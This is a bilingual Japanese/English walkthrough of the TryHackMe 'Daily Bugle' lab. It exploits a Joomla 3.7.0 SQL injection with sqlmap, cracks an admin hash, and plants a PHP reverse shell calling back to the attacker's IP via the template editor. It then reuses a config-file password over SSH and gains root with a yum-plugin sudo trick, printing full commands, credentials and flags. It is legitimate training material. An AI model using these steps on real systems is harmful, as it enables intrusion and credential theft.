# Daily Bugle - TryHackMe CTF Walkthrough

## 目次 / Table of Contents
- [偵察 / Reconnaissance](#reconnaissance)
- [列挙 / Enumeration](#enumeration)
- [エクスプロイト / Exploitation](#exploitation)
- [初期アクセス / Initial Access](#initial-access)
- [横移動 / Lateral Movement](#lateral-movement)
- [権限昇格 / Privilege Escalation](#privilege-escalation)
- [間違いと学び / Mistakes and Learnings](#mistakes-and-learnings)
- [まとめ / Summary](#summary)

---

## 偵察 / Reconnaissance

### 初期ポートスキャン / Initial Port Scan
```bash
nmap --min-rate 5000 -T4 10.49.134.85
```

**結果 / Results:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

3つの開いているポートを発見。Webサーバー、SSH、MySQLが稼働中。

Found three open ports: web server, SSH, and MySQL are running.

---

## 列挙 / Enumeration

### ディレクトリ列挙 / Directory Enumeration
```bash
gobuster dir -u http://10.49.134.85 -w /usr/share/wordlists/dirb/common.txt
```

**主要な発見 / Key Findings:**
- `/administrator` - Joomla管理パネル / Joomla admin panel
- `/components`, `/modules`, `/plugins` - Joomlaの構造を確認 / Joomla structure confirmed
- `/robots.txt` - 存在確認 / Present

ディレクトリ構造からJoomla CMSであることが判明。

Directory structure revealed this is a Joomla CMS.

### Joomlaバージョン検出 / Joomla Version Detection

設問で「Joomlaのバージョンを調べて」と指示があったため、searchsploitで調査。

The question asked to identify the Joomla version, so I investigated using searchsploit.

```bash
searchsploit -m 42033.txt
cat 42033.txt
```

**特定されたバージョン / Identified Version:** Joomla 3.7.0

**脆弱性 / Vulnerability:** CVE-2017-8917 (SQL Injection)

---

## エクスプロイト / Exploitation

### SQLインジェクション (CVE-2017-8917) / SQL Injection

エクスプロイトファイルには2つのアプローチが示されていた：

The exploit file showed two approaches:

1. **手動での脆弱性確認 / Manual verification**
   ```
   http://[ターゲットIP]/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml
   ```

2. **sqlmapを使った自動化 / Automated with sqlmap**

最初は手動とsqlmapのどちらを使うか理解できなかったが、sqlmapの方が効率的だと分かった。

Initially confused about whether to use manual or sqlmap approach, but learned sqlmap is more efficient.

#### ステップ1: データベース列挙 / Step 1: Enumerate Databases

```bash
sqlmap -u "http://10.49.190.46/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

**発見されたデータベース / Databases Found:**
```
[*] information_schema
[*] joomla ⭐
[*] mysql
[*] performance_schema
[*] test
```

**重要な発見 / Key Discovery:**
```
GET parameter 'list[fullordering]' is vulnerable
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```

脆弱性が確認され、joomlaデータベースが見つかった！

Vulnerability confirmed and joomla database found!

#### ステップ2: テーブル列挙 / Step 2: Enumerate Tables

```bash
sqlmap -u "http://10.49.190.46/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  -D joomla --tables
```

**結果 / Results:**
72個のテーブルが見つかり、その中で最も重要なのは `#__users`

Found 72 tables, with `#__users` being the most important:

```
| #__users                   |  ← 管理者情報 / Admin info here!
```

#### ステップ3: ユーザー情報のダンプ / Step 3: Dump User Data

```bash
sqlmap -u "http://10.49.190.46/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  -D joomla -T "#__users" --dump
```

**取得した認証情報 / Retrieved Credentials:**
```
Username: jonah
Email: jonah@tryhackme.com
Role: Super User
Password Hash: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

---

## パスワードクラックの試行錯誤 / Password Cracking Trial and Error

### 試行1: John the Ripper (失敗) / Attempt 1: John the Ripper (Failed)

```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**問題 / Problem:**
```
0g 0:00:09:09 0.13% (ETA: 2026-01-11 05:24) 0g/s 39.94p/s 39.94c/s 39.94C/s
```

bcryptハッシュのクラックは非常に遅く、9分経過してもわずか0.13%しか進まなかった。

Bcrypt cracking was extremely slow - only 0.13% complete after 9 minutes.

### 試行2: CrackStation (失敗) / Attempt 2: CrackStation (Failed)

John the Ripperが遅すぎたため、ブラウザでCrackStationを使用したが、これも失敗。

Since John was too slow, tried CrackStation in browser, but this also failed.

### 試行3: Hydra (誤検知) / Attempt 3: Hydra (False Positives)

```bash
hydra -l jonah -P /usr/share/wordlists/rockyou.txt 10.49.190.46 \
  http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^:F=incorrect" -t 4 -V
```

**結果 / Results:**
```
[80][http-post-form] host: 10.49.190.46   login: jonah   password: password
[80][http-post-form] host: 10.49.190.46   login: jonah   password: 123456
[80][http-post-form] host: 10.49.190.46   login: jonah   password: 123456789
[80][http-post-form] host: 10.49.190.46   login: jonah   password: 12345
1 of 1 target successfully completed, 4 valid passwords found
```

**問題 / Problem:**

4つもパスワードが見つかった？これは誤検知だった。Hydraの失敗判定 `F=incorrect` が正しくないため、全て成功と誤認識した。

Found 4 passwords? This was a false positive. Hydra's failure detection `F=incorrect` was incorrect, causing all attempts to be marked as successful.

ブラウザで4つのパスワードを順番に試したが、全て失敗。

Tried all 4 passwords in browser manually, but all failed.

### 成功: John the Ripper (時間をかけて) / Success: John the Ripper (With Time)

結局John the Ripperに戻り、時間をかけて実行した結果、成功！

Finally returned to John the Ripper and let it run longer - success!

**クラックされたパスワード / Cracked Password:** `spiderman123`

---

## 初期アクセス / Initial Access

### Joomla管理パネルへのログイン / Joomla Admin Panel Login

- URL: `http://10.49.190.46/administrator`
- 認証情報 / Credentials: `jonah:spiderman123`

ログイン成功！管理ダッシュボードにアクセス。

Login successful! Accessed admin dashboard.

### リバースシェルの設置 / Setting Up Reverse Shell

**問題 / Problem:**

ここからシェルの取り方が分からず、Googleで調べた。

Didn't know how to get shell from here, so searched on Google.

**解決策 / Solution:**

Joomlaのテンプレート機能を悪用して、PHPリバースシェルを注入する方法を発見。

Found method to abuse Joomla's template feature to inject PHP reverse shell.

#### 手順 / Steps:

**1. PHPリバースシェルのダウンロード / Download PHP Reverse Shell**
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

**2. シェルの設定編集 / Edit Shell Configuration**
```bash
nano php-reverse-shell.php
```

変更箇所 / Changes:
```php
$ip = '10.49.83.81';  // あなたのOpenVPN IP / Your OpenVPN IP
$port = 4444;         // リスニングポート / Listening port
```

**3. Joomlaテンプレートへの注入 / Inject into Joomla Template**

ナビゲーション / Navigation:
```
Extensions → Templates → Template Customizer
→ Beez3テンプレートを選択 / Select Beez3 template
→ index.php を開く / Open index.php
```

操作 / Actions:
- 元の内容を全削除 / Delete all original content
- PentestMonkeyのリバースシェルコードを貼り付け / Paste PentestMonkey reverse shell code
- 保存 / Save

**4. リスナーの起動 / Start Listener**
```bash
nc -lvnp 4444
```

**5. シェルのトリガー / Trigger Shell**
```bash
curl http://10.49.150.2/templates/beez3/index.php
```

**結果 / Result:**
```
Connection received on 10.49.150.2 37582
Linux dailybugle 3.10.0-1062.el7.x86_64
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.2$
```

`apache`ユーザーとしてシェル接続を取得！

Got shell connection as `apache` user!

---

## 横移動 / Lateral Movement

### データベース設定の発見 / Database Configuration Discovery

```bash
cd /var/www/html
cat configuration.php
```

**発見された認証情報 / Found Credentials:**
```php
public $user = 'root';
public $password = 'nv5uz9r3ZEDzVjNu';
```

Joomlaの設定ファイルにデータベースのパスワードが平文で保存されていた！

Joomla's configuration file stored database password in plaintext!

### SSH横移動の試行 / SSH Lateral Movement Attempt

`/etc/passwd`を確認して、ユーザー`jjameson`を発見。

Checked `/etc/passwd` and found user `jjameson`.

```bash
ssh jjameson@10.49.150.2
Password: nv5uz9r3ZEDzVjNu
```

**成功 / Success!**

パスワード再利用により、データベースのパスワードでSSHログインに成功！

Password reuse allowed SSH login with database password!

**ユーザーフラグ / User Flag:**
```bash
cat /home/jjameson/user.txt
27a260fe3cba712cfdedb1c86d80442e
```

---

## 権限昇格 / Privilege Escalation

### Sudo権限の確認 / Checking Sudo Privileges

```bash
sudo -l
```

**出力 / Output:**
```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

jjamesonユーザーはパスワードなしで`yum`を実行可能！これは権限昇格のチャンス。

User jjameson can run `yum` without password! This is a privilege escalation opportunity.

### Yumプラグインエクスプロイトの試行錯誤 / Yum Plugin Exploit Trial and Error

ここでwalkthroughを参照したが、理解するまでに多くの間違いを犯した。

Consulted walkthrough here, but made many mistakes before understanding.

#### 間違い1: import文の構文エラー / Mistake 1: Import Statement Syntax Error

**❌ 最初の試行 / Initial Attempt:**
```python
from yum.plugins import PluginYumExit, requires_api_version='2.1'
```

**エラー / Error:**
```
Plugin "y" can't be imported
```

**問題 / Problem:**

`import`文の中では代入（=）は使えない。これはPython構文エラー。

Cannot use assignment (=) inside import statement. This is a Python syntax error.

**✅ 正しい方法 / Correct Method:**
```python
from yum.plugins import PluginYumExit

requires_api_version = '2.1'  # グローバル変数として定義 / Define as global variable
```

**理解したこと / Understanding:**

`requires_api_version`はimportするものではなく、モジュールのグローバル変数として定義する必要がある。Yumはこの変数を`mod.requires_api_version`として参照する。

`requires_api_version` must be defined as a module global variable, not imported. Yum references this as `mod.requires_api_version`.

#### 間違い2: Python REPLで実行 / Mistake 2: Running in Python REPL

**❌ やってしまったこと / What I Did:**
```python
>>> import os
>>> from yum.plugins import PluginYumExit
>>> requires_api_version = '2.1'
>>> def init_hook(conduit):
...     os.execl('/bin/sh', '/bin/sh')
>>> sudo yum -c $TF/x --enableplugin=y
  File "<stdin>", line 1
    sudo yum -c $TF/x --enableplugin=y
           ^
SyntaxError: invalid syntax
```

**問題 / Problem:**

Python REPLでコードを書いただけで、ファイルとして保存していなかった。Yumは`.py`ファイルを読み込む必要がある。

Wrote code only in Python REPL without saving to file. Yum needs to load a `.py` file.

**✅ 正しい方法 / Correct Method:**

ファイルとして作成する必要がある。

Must create as a file:

```bash
cat > $TF/y.py <<EOF
import os
from yum.plugins import PluginYumExit

requires_api_version = '2.1'

def init_hook(conduit):
    os.execl('/bin/sh', '/bin/sh')
EOF
```

#### 間違い3: y.pyファイルを作成し忘れ / Mistake 3: Forgot to Create y.py File

**❌ 作成したファイル / Files Created:**
```
$TF/x        ← yum.conf
$TF/y.conf   ← plugin設定 / plugin config
```

**エラー / Error:**
```
No plugin match for: y
```

**問題 / Problem:**

肝心の`y.py`（プラグイン本体）が存在しない！

The crucial `y.py` (plugin code) doesn't exist!

**Yumプラグインの命名ルール / Yum Plugin Naming Rules:**

| 要素 / Element | 必須 / Required |
|---------|----------|
| プラグイン本体 / Plugin code | `pluginname.py` |
| 設定ファイル / Config file | `pluginname.conf` |
| enable指定 / Enable flag | `--enableplugin=pluginname` |

名前の一致が必須！

Name matching is mandatory!

#### 間違い4: yumサブコマンドなし / Mistake 4: No Yum Subcommand

**❌ 実行したコマンド / Command Run:**
```bash
sudo yum -c $TF/x --enableplugin=y
```

**エラー / Error:**
```
You need to give some command
```

**問題 / Problem:**

yumはサブコマンド（help, list, update等）が必須。

Yum requires a subcommand (help, list, update, etc.).

**✅ 正しい方法 / Correct Method:**
```bash
sudo yum -c $TF/x --enableplugin=y help
```

### 成功した手順 / Successful Procedure

**完全な手順 / Complete Steps:**

```bash
# 1. 一時ディレクトリ作成 / Create temp directory
TF=$(mktemp -d)

# 2. yum設定ファイル / Yum config file
cat > $TF/x <<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

# 3. プラグイン設定 / Plugin config
cat > $TF/y.conf <<EOF
[main]
enabled=1
EOF

# 4. プラグイン本体（重要！）/ Plugin code (Critical!)
cat > $TF/y.py <<EOF
import os
from yum.plugins import PluginYumExit

requires_api_version = '2.1'

def init_hook(conduit):
    os.execl('/bin/sh', '/bin/sh')
EOF

# 5. エクスプロイト実行 / Execute exploit
sudo yum -c $TF/x --enableplugin=y help
```

**結果 / Result:**
```
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
```

rootシェル取得成功！

Root shell obtained successfully!

**ファイル構造 / File Structure:**
```
$TF/
 ├── x        ← yum.conf
 ├── y.conf   ← plugin設定 / plugin config
 └── y.py     ← plugin本体（必須！）/ plugin code (must exist!)
```

**Rootフラグ / Root Flag:**
```bash
cd /root
cat root.txt
eec3d53292b1821868266858d7fa6f79
```

---

## 間違いと学び / Mistakes and Learnings

### SQLインジェクションの流れ / SQL Injection Flow

**学んだパターン / Learned Pattern:**
```
1. 脆弱性発見 / Vulnerability discovery
   ↓
2. データベース列挙 (--dbs) / Database enumeration
   ↓
3. テーブル列挙 (--tables) / Table enumeration
   ↓
4. データ抽出 (--dump) / Data extraction
   ↓
5. 認証情報の使用 / Credential usage
```

この順番で徐々に深く侵入していくのが定石。

This is the standard progression for gradually penetrating deeper.

### パスワードクラックの教訓 / Password Cracking Lessons

1. **bcryptは時間がかかる / Bcrypt takes time**
   - John the Ripperは遅いが確実 / Slow but reliable
   - オンラインツール（CrackStation）は万能ではない / Online tools not always effective

2. **Hydraの誤検知 / Hydra false positives**
   - 失敗判定文字列の正確性が重要 / Accurate failure detection string is crucial
   - 結果は必ず手動で検証すべき / Always verify results manually

### Yumプラグインの仕組み / Yum Plugin Mechanism

**重要なポイント / Key Points:**

1. **構文エラーを避ける / Avoid syntax errors**
   - ❌ `from yum.plugins import requires_api_version='2.1'`
   - ✅ `requires_api_version = '2.1'` (グローバル変数 / global variable)

2. **ファイル構造の完全性 / Complete file structure**
   - `pluginname.py` と `pluginname.conf` の両方が必須 / Both required
   - 名前の一致が必須 / Name matching mandatory

3. **実行環境 / Execution environment**
   - Python REPLではなくファイルとして保存 / Save as file, not in REPL
   - yumサブコマンドが必須 / Yum subcommand required

4. **動作原理 / How it works**
   - `init_hook()`はyum初期化時に呼ばれる / Called during yum initialization
   - `sudo`で実行するため、`os.execl()`がrootシェルを生成 / Runs with sudo, so spawns root shell
   - プラグイン機構が通常の権限境界をバイパス / Plugin mechanism bypasses normal privilege boundaries

### セキュリティの教訓 / Security Lessons

1. **パスワード再利用の危険性 / Password Reuse Danger**
   - データベースパスワード → SSHログイン成功 / Database password → SSH login success

2. **平文パスワード保存 / Plaintext Password Storage**
   - `configuration.php`に平文で保存されていた / Stored in plaintext in config file

3. **Sudo設定の重要性 / Sudo Configuration Importance**
   - パッケージマネージャーへのsudo権限は危険 / Sudo access to package managers is dangerous

4. **デフォルトCMSの脆弱性 / Default CMS Vulnerabilities**
   - Joomla 3.7.0には重大なSQLi脆弱性 / Critical SQLi in Joomla 3.7.0

---

## まとめ / Summary

### 攻撃チェーン / Attack Chain

```
Nmap偵察 / Nmap Recon
    ↓
Gobuster列挙 / Gobuster Enum
    ↓
Joomla 3.7.0 SQLi (CVE-2017-8917)
    ↓
sqlmapでDB抽出 / sqlmap DB extraction
    ↓
John the Ripperでパスワードクラック / Password cracking
    ↓
管理パネルログイン / Admin panel login
    ↓
テンプレート経由でリバースシェル / Reverse shell via template
    ↓
設定ファイルからパスワード取得 / Password from config file
    ↓
SSHで横移動 / SSH lateral movement
    ↓
Yumプラグインで権限昇格 / Yum plugin privilege escalation
    ↓
Root権限取得 / Root access obtained
```

### 使用したツール / Tools Used

- `nmap` - ポートスキャン / Port scanning
- `gobuster` - ディレクトリ列挙 / Directory enumeration
- `searchsploit` - エクスプロイト検索 / Exploit search
- `sqlmap` - SQLインジェクション自動化 / SQL injection automation
- `john` - パスワードハッシュクラック / Password hash cracking
- `hydra` - ブルートフォース（誤検知あり）/ Brute force (had false positives)
- `nc` - リバースシェルリスナー / Reverse shell listener
- PentestMonkey PHP Reverse Shell
- GTFOBins - 権限昇格リサーチ / Privilege escalation research

### フラグ / Flags

- **User Flag:** `27a260fe3cba712cfdedb1c86d80442e`
- **Root Flag:** `eec3d53292b1821868266858d7fa6f79`

### 参考資料 / References

- [CVE-2017-8917 - Joomla 3.7.0 SQLi](https://www.exploit-db.com/exploits/42033)
- [GTFOBins - Yum](https://gtfobins.github.io/gtfobins/yum/)
- [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [Sucuri Blog - Joomla SQLi](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html)

---

**完了日 / Completion Date:** January 6, 2026  
**難易度 / Difficulty:** Medium  
**プラットフォーム / Platform:** TryHackMe

**学習時間 / Learning Time:** 約6時間（試行錯誤を含む）/ ~6 hours (including trial and error)

---

## 謝辞 / Acknowledgments

このwriteupは、試行錯誤のプロセスを含めて正直に記録しました。間違いから学ぶことが最も重要だと考えています。

This writeup honestly documents the trial-and-error process. I believe learning from mistakes is most important.

特にYumプラグインの権限昇格については、walkthroughを参照しながら何度も失敗し、最終的に仕組みを理解できました。

Especially for the Yum plugin privilege escalation, I failed multiple times while consulting walkthroughs, but eventually understood the mechanism.

**重要 / Important:**

このwriteupは教育目的のみです。許可なくシステムに侵入することは違法です。

This writeup is for educational purposes only. Unauthorized system access is illegal.
